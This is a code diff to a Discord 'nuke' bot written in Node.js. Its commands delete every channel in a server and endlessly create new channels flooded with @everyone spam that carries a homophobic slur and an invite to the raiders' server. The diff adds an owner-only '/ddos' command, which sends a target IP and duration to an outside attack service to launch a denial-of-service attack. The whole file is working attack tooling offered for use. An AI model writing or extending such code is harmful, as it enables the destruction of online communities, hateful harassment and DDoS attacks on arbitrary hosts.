@@ -4,6 +4,7 @@ const express = require('express');
 const app = express();
 
 const TOKEN = process.env.TOKEN;
+const OWNER_ID = process.env.OWNER_ID;
 const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
 const PORT = process.env.PORT || 3000;
@@ -41,6 +42,7 @@ async function registerCommands() {
         { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
         { name: 'nuke', description: 'Ultra-fast infinite nuke' },
         { name: 'stop', description: 'Stop the nuke' },
+        { name: 'ddos', description: '[OWNER ONLY] Launch a DDoS attack', options: [{ name: 'ip', type: 3, description: 'Target IP', required: true }, { name: 'duration', type: 4, description: 'Seconds (default 60)', required: false }] },
         { name: 'ad', description: 'Advertise the server invite' },
         { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
         { name: 'ping', description: 'Check bot latency' },
@@ -84,6 +86,13 @@ client.on('interactionCreate', async (interaction) => {
     try {
         const { commandName, options, user, member, guild, channel } = interaction;
         console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);
+
+        // ---- OWNER CHECK (NUKE, STOP, DDOS) ----
+        if (commandName === 'nuke' || commandName === 'stop' || commandName === 'ddos') {
+            if (!OWNER_ID || user.id !== OWNER_ID) {
+                return interaction.editReply('❌ You are not authorized to use this command.');
+            }
+        }
 
         // ---- STOP ----
         if (commandName === 'stop') {
@@ -129,7 +138,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- NUKE (Ultra-fast) ----
+        // ---- NUKE ----
         if (commandName === 'nuke') {
             if (nukeRunning) {
                 return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
@@ -144,23 +153,19 @@ client.on('interactionCreate', async (interaction) => {
 
             await interaction.editReply('🚀 **Ultra-fast nuke started!** Use `/stop` to stop it.');
 
-            // Delete all existing channels
             await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
 
             const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
             const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
 
-            // Build the spam message once
             const line = variants[0];
             let big = `@everyone ${line}\n`;
             while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
             big += `\n${inviteLine}`;
             const spamMessage = big.slice(0, 2000);
 
-            // ---- PARALLEL: Create channels AND spam them ----
             let channelIndex = 0;
             while (nukeRunning && nukeGuildId === guild.id) {
-                // Create a batch of channels (10 at a time)
                 const batchSize = 10;
                 const createPromises = [];
                 for (let i = 0; i < batchSize; i++) {
@@ -170,9 +175,7 @@ client.on('interactionCreate', async (interaction) => {
                             .then(c => {
                                 if (c) {
                                     activeChannels.push(c);
-                                    // Immediately send the spam message to this channel (no delay)
                                     c.send(spamMessage).catch(() => {});
-                                    // Also keep spamming it in a loop
                                     spamChannelContinuously(c);
                                 }
                                 return c;
@@ -180,14 +183,30 @@ client.on('interactionCreate', async (interaction) => {
                             .catch(() => null)
                     );
                 }
-                // Wait for all channels in this batch to be created
                 await Promise.all(createPromises);
                 channelIndex++;
             }
 
-            // Cleanup
             nukeRunning = false;
             activeChannels = [];
+            return;
+        }
+
+        // ---- DDOS ----
+        if (commandName === 'ddos') {
+            const ip = options.getString('ip');
+            const duration = options.getInteger('duration') || 60;
+
+            try {
+                await fetch('https://ddos-runner.onrender.com/attack', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ip, duration })
+                });
+                await interaction.editReply(`✅ **Attack launched on ${ip} for ${duration}s**`);
+            } catch (e) {
+                await interaction.editReply('❌ Attack runner is down.');
+            }
             return;
         }
 
@@ -335,7 +354,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- CONTINUOUS SPAMMING FUNCTION ----
 async function spamChannelContinuously(channel) {
     const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
     const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
